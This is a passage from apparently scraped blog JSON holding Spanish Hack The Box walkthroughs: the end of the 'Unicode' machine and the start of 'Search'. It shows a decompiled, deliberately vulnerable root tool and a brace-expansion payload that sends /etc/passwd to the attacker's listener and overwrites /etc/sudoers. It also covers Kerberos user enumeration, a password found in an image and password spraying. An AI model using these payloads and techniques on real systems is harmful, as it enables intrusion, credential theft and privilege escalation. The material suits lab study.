1, \u0026#39;b\u0026#39;, \u0026#39;libpython3.8.so.1.0\u0026#39;), (4391610, 134817, 319528, 1, \u0026#39;b\u0026#39;, \u0026#39;libreadline.so.8\u0026#39;), (4526427, 234757, 598104, 1, \u0026#39;b\u0026#39;, \u0026#39;libssl.so.1.1\u0026#39;), (4761184, 69952, 192032, 1, \u0026#39;b\u0026#39;, \u0026#39;libtinfo.so.6\u0026#39;), (4831136, 55907, 108936, 1, \u0026#39;b\u0026#39;, \u0026#39;libz.so.1\u0026#39;), (4887043, 204876, 777217, 1, \u0026#39;x\u0026#39;, \u0026#39;base_library.zip\u0026#39;), (5091919, 1703522, 1703522, 0, \u0026#39;z\u0026#39;, \u0026#39;PYZ-00.pyz\u0026#39;)] ? U: go Up one level O \u0026lt;name\u0026gt;: open embedded archive name X \u0026lt;name\u0026gt;: extract name Q: quit ? x treport to filename? treport.pyc ? x struct to filename? struct.pyc ? q Tras ello, intentamos decompilar dicho archivo pero parece estar \u0026ldquo;dañado\u0026rdquo;. Tras intentar con el archivo struct.pyc logramos obtener una porcion del codigo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 π ~/htb/unicode/binary ❯ uncompyle6 treport.pyc Unknown magic number 227 in treport.pyc π ~/htb/unicode/binary ❯ uncompyle6 struct.pyc # uncompyle6 version 3.8.0 # Python bytecode 3.8.0 (3413) # Decompiled from: Python 2.7.18 (default, Jul 14 2021, 08:11:37) # [GCC 10.2.1 20210110] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: struct.py # Compiled at: 1995-09-27 16:18:56 # Size of source mod 2**32: 257 bytes __all__ = [ \u0026#39;calcsize\u0026#39;, \u0026#39;pack\u0026#39;, \u0026#39;pack_into\u0026#39;, \u0026#39;unpack\u0026#39;, \u0026#39;unpack_from\u0026#39;, \u0026#39;iter_unpack\u0026#39;, \u0026#39;Struct\u0026#39;, \u0026#39;error\u0026#39;] from _struct import * from _struct import _clearcache from _struct import __doc__ # okay decompiling struct.pyc π ~/htb/unicode/binary ❯ Fix Pyc File uncompyle6 no logra decompilar el archivo ya que hacen faltan los \u0026ldquo;magic numbers\u0026rdquo; y \u0026ldquo;timestamp\u0026rdquo;. Para repararlo debemos de obtener los 16 bytes iniciales de un archivo .pyc sin algun daño o que pueda ser decompilado, en este caso vemos el archivo struct.pyc. Comparando ambos archivos vemos que struct tiene los 16 bytes iniciales a diferencia de treport que no los tiene.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/unicode/binary ❯ xxd struct.pyc|head 00000000: 550d 0d0a 0000 0000 7079 6930 0101 0000 U.......pyi0.... 00000010: e300 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0008 0000 0040 0000 0073 3800 0000 6400 .....@...s8...d. 00000030: 6401 6402 6403 6404 6405 6406 6407 6708 d.d.d.d.d.d.d.g. 00000040: 5a00 6408 6409 6c01 5400 6408 640a 6c01 Z.d.d.l.T.d.d.l. 00000050: 6d02 5a02 0100 6408 640b 6c01 6d03 5a03 m.Z...d.d.l.m.Z. 00000060: 0100 640c 5300 290d da08 6361 6c63 7369 ..d.S.)...calcsi 00000070: 7a65 da04 7061 636b da09 7061 636b 5f69 ze..pack..pack_i 00000080: 6e74 6fda 0675 6e70 6163 6bda 0b75 6e70 nto..unpack..unp 00000090: 6163 6b5f 6672 6f6d da0b 6974 6572 5f75 ack_from..iter_u π ~/htb/unicode/binary ❯ xxd treport.pyc| head 00000000: e300 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0006 0000 0040 0000 0073 f600 0000 6400 .....@...s....d. 00000020: 6401 6c00 5a00 6400 6401 6c01 5a01 6400 d.l.Z.d.d.l.Z.d. 00000030: 6402 6c02 6d02 5a02 0100 6400 6401 6c03 d.l.m.Z...d.d.l. 00000040: 5a03 4700 6403 6404 8400 6404 8302 5a04 Z.G.d.d...d...Z. 00000050: 6505 6405 6b02 72f2 6504 8300 5a06 6507 e.d.k.r.e...Z.e. 00000060: 6406 8301 0100 6507 6407 8301 0100 6507 d.....e.d.....e. 00000070: 6408 8301 0100 6507 6409 8301 0100 640a d.....e.d.....d. 00000080: 5a08 6508 72f2 6509 640b 8301 5a0a 7a0c Z.e.r.e.d...Z.z. 00000090: 650b 650a 8301 5a0a 5700 6e1e 0100 0100 e.e...Z.W.n..... π ~/htb/unicode/binary ❯ Utilizamos el editor wxHexEditor (instalamos por medio de apt).\n1 sudo apt install sudo apt install wxhexeditor Abrimos el archivo treport.pyc con esta herramienta, insertamos 16 bytes en \u0026quot;Edit \u0026gt; Insert\u0026quot; al inicio.\nLuego de ello agregamos los 16 bytes iniciales de struct.pyc.\n1 550d 0d0a 0000 0000 7079 6930 0101 0000 Tras realizar esto, guardamos el archivo, y ejecutamos uncompyle6, logrando obtener el codigo fuente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 π ~/htb/unicode/binary ❯ ls treport_fixed.pyc treport_fixed.pyc π ~/htb/unicode/binary ❯ uncompyle6 treport_fixed.pyc # uncompyle6 version 3.8.0 # Python bytecode 3.8.0 (3413) # Decompiled from: Python 2.7.18 (default, Jul 14 2021, 08:11:37) # [GCC 10.2.1 20210110] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: treport.py # Compiled at: 1995-09-27 16:18:56 # Size of source mod 2**32: 257 bytes import os, sys from datetime import datetime import re class threat_report: def create(self): file_name = input(\u0026#39;Enter the filename:\u0026#39;) content = input(\u0026#39;Enter the report:\u0026#39;) if \u0026#39;../\u0026#39; in file_name: print(\u0026#39;NOT ALLOWED\u0026#39;) sys.exit(0) file_path = \u0026#39;/root/reports/\u0026#39; + file_name with open(file_path, \u0026#39;w\u0026#39;) as (fd): fd.write(content) def list_files(self): file_list = os.listdir(\u0026#39;/root/reports/\u0026#39;) files_in_dir = \u0026#39; \u0026#39;.join([str(elem) for elem in file_list]) print(\u0026#39;ALL THE THREAT REPORTS:\u0026#39;) print(files_in_dir) def read_file(self): file_name = input(\u0026#39;\\nEnter the filename:\u0026#39;) if \u0026#39;../\u0026#39; in file_name: print(\u0026#39;NOT ALLOWED\u0026#39;) sys.exit(0) contents = \u0026#39;\u0026#39; file_name = \u0026#39;/root/reports/\u0026#39; + file_name try: with open(file_name, \u0026#39;r\u0026#39;) as (fd): contents = fd.read() except: print(\u0026#39;SOMETHING IS WRONG\u0026#39;) else: print(contents) def download(self): now = datetime.now() current_time = now.strftime(\u0026#39;%H_%M_%S\u0026#39;) command_injection_list = [\u0026#39;$\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;@\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;] ip = input(\u0026#39;Enter the IP/file_name:\u0026#39;) res = bool(re.search(\u0026#39;\\\\s\u0026#39;, ip)) if res: print(\u0026#39;INVALID IP\u0026#39;) sys.exit(0) if \u0026#39;file\u0026#39; in ip or \u0026#39;gopher\u0026#39; in ip or \u0026#39;mysql\u0026#39; in ip: print(\u0026#39;INVALID URL\u0026#39;) sys.exit(0) for vars in command_injection_list: if vars in ip: print(\u0026#39;NOT ALLOWED\u0026#39;) sys.exit(0) cmd = \u0026#39;/bin/bash -c \u0026#34;curl \u0026#39; + ip + \u0026#39; -o /root/reports/threat_report_\u0026#39; + current_time + \u0026#39;\u0026#34;\u0026#39; os.system(cmd) if __name__ == \u0026#39;__main__\u0026#39;: obj = threat_report() print(\u0026#39;1.Create Threat Report.\u0026#39;) print(\u0026#39;2.Read Threat Report.\u0026#39;) print(\u0026#39;3.Download A Threat Report.\u0026#39;) print(\u0026#39;4.Quit.\u0026#39;) check = True if check: choice = input(\u0026#39;Enter your choice:\u0026#39;) try: choice = int(choice) except: print(\u0026#39;Wrong Input\u0026#39;) sys.exit(0) else: if choice == 1: obj.create() elif choice == 2: obj.list_files() obj.read_file() elif choice == 3: obj.download() elif choice == 4: check = False else: print(\u0026#39;Wrong input.\u0026#39;) # okay decompiling treport_fixed.pyc π ~/htb/unicode/binary ❯ Command Injection \u0026ldquo;Bypass\u0026rdquo; En la función download() vemos que existe un \u0026ldquo;filtro\u0026rdquo; para Command Injection de diferentes caracteres que son utilzados para verificar que ninguno de estos exista en la variable que obtiene la IP y archivo para su descarga.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def download(self): now = datetime.now() current_time = now.strftime(\u0026#39;%H_%M_%S\u0026#39;) command_injection_list = [\u0026#39;$\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;@\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;] ip = input(\u0026#39;Enter the IP/file_name:\u0026#39;) res = bool(re.search(\u0026#39;\\\\s\u0026#39;, ip)) if res: print(\u0026#39;INVALID IP\u0026#39;) sys.exit(0) if \u0026#39;file\u0026#39; in ip or \u0026#39;gopher\u0026#39; in ip or \u0026#39;mysql\u0026#39; in ip: print(\u0026#39;INVALID URL\u0026#39;) sys.exit(0) for vars in command_injection_list: if vars in ip: print(\u0026#39;NOT ALLOWED\u0026#39;) sys.exit(0) cmd = \u0026#39;/bin/bash -c \u0026#34;curl \u0026#39; + ip + \u0026#39; -o /root/reports/threat_report_\u0026#39; + current_time + \u0026#39;\u0026#34;\u0026#39; os.system(cmd) Siguiendo algunos posts (1, 2, 3) crafteamos un comando que podemos utilizar para obtener un archivo utilizando curl. En este caso estamos realizando \u0026ldquo;bypass\u0026rdquo; utilizando brackets ({}) y comas (,), enviamos un archivo con la opcion -T.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # curl --help [.. snip ..] # -T, --upload-file \u0026lt;file\u0026gt; Transfer local FILE to destination [.. snip ..] # Comando # {10.10.14.30,-T,/etc/passwd} code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{10.10.14.30,-T,/etc/passwd} % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1876 0 0 100 1876 0 662 0:00:02 0:00:02 --:--:-- 661 curl: (1) Received HTTP/0.9 when not allowed Enter your choice De nuestro lado tenemos netcat a la escucha, que, tras enviar esta peticion, logramos obtener el archivo especificado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 π ~/htb/unicode/binary ❯ nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.30] from hackmedia.htb [10.10.11.126] 37864 PUT /passwd HTTP/1.1 Host: 10.10.14.30 User-Agent: curl/7.68.0 Accept: */* Content-Length: 1876 Expect: 100-continue root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync [.. snip ..] usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false code:x:1000:1000:,,,:/home/code:/bin/bash Logramos obtener la clave privada de root pero no parece funcionar. Utilizamos una forma similar de escalar privilegios que en Curling - HTB donde modificamos el archivo /etc/sudoers con permisos para el usuario code. El archivo quedaría de la siguiente forma:\n1 2 root ALL=(ALL:ALL) ALL code ALL=(ALL:ALL) ALL En la maquina ejecutaríamos el siguiente commando.\n1 {10.10.14.30/sudoers,-o,/etc/sudoers} Tras realizar esto, el archivo se modificaría, logrando obtener acceso root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 code@code:~$ sudo -l -l [sudo] password for code: User code may run the following commands on code: Sudoers entry: RunAsUsers: ALL RunAsGroups: ALL Commands: ALL code@code:~$ sudo bash root@code:/home/code# id uid=0(root) gid=0(root) groups=0(root) root@code:/home/code# cd root@code:~# ls root.txt root@code:~# cat root.txt ad5125c0457f32b19428adac62253ddf root@code:~# ","description":"Unicode presenta un sitio web donde obtuvimos acceso modificando un token JWT, para luego realizar Path Traversal utilizando caracteres Unicode lo que nos permitio acceder al codigo fuente y a la máquina. Finalmente escalamos privilegios obteniendo el codigo fuente de un fichero en python y realizando 'bypass'.","id":28,"section":"posts","tags":["flask","flask-unicode","jwt.io","jwt","curl","uncompyle6","pyinstaller",""],"title":"Hack The Box - Unicode","uri":"https://sckull.github.io/posts/unicode/"},{"content":"\rTras realizar una enumeración de usuarios y encontrar credenciales en el sitio web realizamos Kerberoasting. Password Spraying nos dieron acceso a un siguiente usuario donde encontramos un archivo Excel con una lista de contraseñas, una de ellas nos dio acceso por Powershell Web. Finalmente encontramos una ruta en Bloodhound para obtener acceso a un usuario del grupo Domain Admin para finalmente acceder como Administrador.\nNombre Search OS Windows Puntos 40 Dificultad Dificil IP 10.10.11.129 Maker dmw0ng\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8, 7.4, 5.1, 4.9, 2.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 # Nmap 7.91 scan initiated Fri Mar 4 22:59:35 2022 as: nmap -p53,80,88,135,139,389,443,445,464,593,3268,8172,9389,49666,49675,49676,49703,49714,49738 -sV -sC -oN nmap_scan 10.10.11.129 Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.37s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Search \u0026amp;mdash; Just Testing IIS 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-04 22:59:40Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 |_ssl-date: 2022-03-04T23:01:13+00:00; -5s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Search \u0026amp;mdash; Just Testing IIS | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 |_ssl-date: 2022-03-04T23:01:13+00:00; -5s from scanner time. | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 |_ssl-date: 2022-03-04T23:01:13+00:00; -8s from scanner time. 8172/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title. | ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH | Not valid before: 2020-04-07T09:05:25 |_Not valid after: 2030-04-05T09:05:25 |_ssl-date: 2022-03-04T23:01:13+00:00; -5s from scanner time. | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC 49738/tcp open msrpc Microsoft Windows RPC Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -5s, deviation: 1s, median: -5s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-03-04T23:00:37 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 4 23:01:22 2022 -- 1 IP address (1 host up) scanned in 106.92 seconds RPC Una sesion nula por RPC no muestra información, es necesario autenticación.\n1 2 3 4 5 6 π ~/htb/search ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.11.129 rpcclient $\u0026gt; enumdomusers result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; enumdomgroups result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; Samba Al igual que rpc, samba requiere de autenticación para acceder a los recursos compartidos.\n1 2 3 4 5 π ~/htb/search ❯ crackmapexec smb 10.10.11.129 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.129 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB 10.10.11.129 445 RESEARCH [-] search.htb\\: STATUS_ACCESS_DENIED SMB 10.10.11.129 445 RESEARCH [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) π ~/htb/search Ldap ldap necesita de credenciales para obtener información.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 π ~/htb/search ❯ ldapsearch -x -h 10.10.11.129 -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=search,DC=htb namingcontexts: CN=Configuration,DC=search,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=search,DC=htb namingcontexts: DC=DomainDnsZones,DC=search,DC=htb namingcontexts: DC=ForestDnsZones,DC=search,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 π ~/htb/search ❯ ldapsearch -x -h 10.10.11.129 -D \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#39;DC=search,DC=htb\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;DC=search,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 π ~/htb/search ❯ Web Site Los Headers del sitio web muestran que corre un Microsoft IIS 10.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/search ❯ curl -sI 10.10.11.129 HTTP/1.1 200 OK Content-Length: 44982 Content-Type: text/html Last-Modified: Tue, 11 Aug 2020 10:13:04 GMT Accept-Ranges: bytes ETag: \u0026#34;5f3800c86fd61:0\u0026#34; Server: Microsoft-IIS/10.0 X-Powered-By: ASP.NET Date: Fri, 04 Mar 2022 23:03:12 GMT El sitio web presenta servicios, caracteristicas e información sobre la empresa (team, testimonios, etc.), además, en el formulario de contacto observamos el dominio search.htb el cual agregamos a /etc/hosts.\nFull Website\rDirectory Brute Forcing feroxbuster muestra multiples paginas, una de ellas es /staff.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 π ~/htb/search ❯ feroxbuster -u http://search.htb -w $MD --depth 1 -x asp,aspx,html ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://search.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [asp, aspx, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 2l 10w 148c http://search.htb/images =\u0026gt; http://search.htb/images/ 200 GET 1030l 2969w 44982c http://search.htb/index.html 200 GET 17l 76w 931c http://search.htb/main.html 301 GET 2l 10w 148c http://search.htb/Images =\u0026gt; http://search.htb/Images/ 403 GET 29l 92w 1233c http://search.htb/staff 301 GET 2l 10w 145c http://search.htb/css =\u0026gt; http://search.htb/css/ 200 GET 1030l 2969w 44982c http://search.htb/Index.html 301 GET 2l 10w 144c http://search.htb/js =\u0026gt; http://search.htb/js/ 200 GET 17l 76w 931c http://search.htb/Main.html 403 GET 29l 92w 1233c http://search.htb/Staff 301 GET 2l 10w 147c http://search.htb/fonts =\u0026gt; http://search.htb/fonts/ 301 GET 2l 10w 148c http://search.htb/IMAGES =\u0026gt; http://search.htb/IMAGES/ 200 GET 1030l 2969w 44982c http://search.htb/INDEX.html 301 GET 2l 10w 147c http://search.htb/Fonts =\u0026gt; http://search.htb/Fonts/ 200 GET 373l 1419w 19559c http://search.htb/single.html 301 GET 2l 10w 145c http://search.htb/CSS =\u0026gt; http://search.htb/CSS/ 301 GET 2l 10w 144c http://search.htb/JS =\u0026gt; http://search.htb/JS/ 200 GET 17l 76w 931c http://search.htb/MAIN.html 500 GET 80l 276w 3420c http://search.htb/%22julie%20roehm%22.aspx 500 GET 80l 276w 3420c http://search.htb/%22james%20kim%22.aspx 500 GET 80l 276w 3420c http://search.htb/%22britney%20spears%22.aspx Restricted Site Tras visitar la pagina /staff nos muestra que las credenciales que proporcionamos no tienen permisos para acceder a esta pagina.\nSi recordamos, nmap muestra el puerto 445 (https), tras agregar https al sitio, observamos que pregunta por un certificado, por lo que para acceder a esta página es necesario contar con uno.\nEnum Users Kerbrute Realizamos una enumeración de usuarios utilizando un wordlist de SecList, encontramos dos usuarios válidos. Sin embargo no obtuvimos mucha información en los diferentes servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/search ❯ ./kerbrute userenum -d search.htb xato-net-10-million-usernames-dup.txt --dc 10.10.11.129 -t 100 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/01/22 - Ronnie Flathers @ropnop 2022/04/01 19:10:24 \u0026gt; Using KDC(s): 2022/04/01 19:10:24 \u0026gt; 10.10.11.129:88 2022/04/01 19:10:55 \u0026gt; [+] VALID USERNAME: administrator@search.htb 2022/04/01 19:11:09 \u0026gt; [+] VALID USERNAME: research@search.htb 2022/04/01 19:11:51 \u0026gt; [+] VALID USERNAME: Administrator@search.htb 2022/04/01 19:51:39 \u0026gt; [+] VALID USERNAME: RESEARCH@search.htb 2022/04/01 19:54:18 \u0026gt; Done! Tested 624370 usernames (4 valid) in 2634.573 seconds Usernames Si recordamos, en el sitio web hay una lista de nombres (en el apartado Team), utilizamos estos para crear un nuevo wordlist utilizando un Script en python.\n1 2 3 4 5 6 7 8 9 10 11 12 Keely Lyons Dax Santiago Sierra Frye Kyla Stewart Kaiara Spencer Dave Simpson Ben Thompson Chris Stewart John Smith Christine Aguilar Robert Spears Bruce Rogers Generamos 120 posibles nombres de usuarios.\n1 2 3 4 π ~/htb/search/usernames ❯ ./usernames.py team.txt \u0026gt; users.txt π ~/htb/search/usernames ❯ wc -l users.txt 120 users.txt π ~/htb/search/usernames ❯ Encontramos tres nombres de usuarios válidos con kerbrute.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/search ❯ ./kerbrute userenum -d search.htb usernames/users.txt --dc 10.10.11.129 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/01/22 - Ronnie Flathers @ropnop 2022/04/01 20:24:26 \u0026gt; Using KDC(s): 2022/04/01 20:24:26 \u0026gt; 10.10.11.129:88 2022/04/01 20:24:26 \u0026gt; [+] VALID USERNAME: keely.lyons@search.htb 2022/04/01 20:24:26 \u0026gt; [+] VALID USERNAME: dax.santiago@search.htb 2022/04/01 20:24:26 \u0026gt; [+] VALID USERNAME: sierra.frye@search.htb 2022/04/01 20:24:27 \u0026gt; Done! Tested 120 usernames (3 valid) in 0.849 seconds π ~/htb/search ❯ Sin embargo ninguna combinación de los usuarios válidos nos permitio acceder por smb/ldap/rpc.\nUsuarios Válidos\r1 2 3 4 5 keely.lyons dax.santiago sierra.frye administrator research Note - Creds En el sitio web descubrimos una imagen donde se leen notas, en esta se mencionan nombres y una contraseña para \u0026lsquo;Hope Sharp\u0026rsquo;, vemos IsolationIsKey?, la cual podría ser la contraseña.\nCreamos un wordlist con los nombres de usuarios y las palabras \u0026ldquo;relevantes\u0026rdquo;, nuevamente utilizamos el Script en python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 Working from Home Key staff to stay Hospital Appointment Harrods 9am Phisher Walter Send password to Hope Sharp IsolationIsKey? Meeting with Board Hunter and Jordan Hunter Jordan Jordan Hunter Harrods Jordan Harrods Hunter Utilizamos kerbrute con el nuevo wordlist, vemos que hope.sharp es un usuario válido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/search ❯ ./kerbrute userenum -d search.htb --dc 10.10.11.129 wordlist_image.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/01/22 - Ronnie Flathers @ropnop 2022/04/01 21:14:28 \u0026gt; Using KDC(s): 2022/04/01 21:14:28 \u0026gt; 10.10.11.129:88 2022/04/01 21:14:28 \u0026gt; [+] VALID USERNAME: hope.sharp@search.htb 2022/04/01 21:14:28 \u0026gt; Done! Tested 70 usernames (1 valid) in 0.506 seconds π ~/htb/search ❯ SMB - Hope Sharp Password Spraying Utilizamos el wordlist con todos los usuarios válidos que encontramos y 